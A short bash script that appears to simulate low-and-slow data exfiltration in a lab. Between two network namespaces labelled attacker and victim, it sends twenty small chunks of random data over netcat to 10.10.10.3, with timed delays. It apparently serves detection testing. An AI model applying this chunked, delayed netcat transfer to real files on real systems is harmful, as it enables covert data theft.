#!/bin/bash
# Simulate low-and-slow exfiltration: small chunks sent repeatedly over time
CHUNK_SIZE_KB=50
NUM_CHUNKS=20
DELAY_SECONDS=5

# Create one small chunk file to reuse
sudo ip netns exec attacker dd if=/dev/urandom of=/tmp/chunk.bin bs=1K count=$CHUNK_SIZE_KB 2>/dev/null

for i in $(seq 1 $NUM_CHUNKS); do
  echo "Sending chunk $i/$NUM_CHUNKS..."
  sudo ip netns exec victim bash -c "setsid nohup nc -l -p 9998 > /tmp/trickle_recv_$i.bin 2>/tmp/nc_trickle.log < /dev/null &"
  sleep 0.5
  sudo ip netns exec attacker nc -q1 10.10.10.3 9998 < /tmp/chunk.bin
  sleep $DELAY_SECONDS
done

echo "Trickle exfiltration complete: $NUM_CHUNKS chunks of ${CHUNK_SIZE_KB}KB sent."
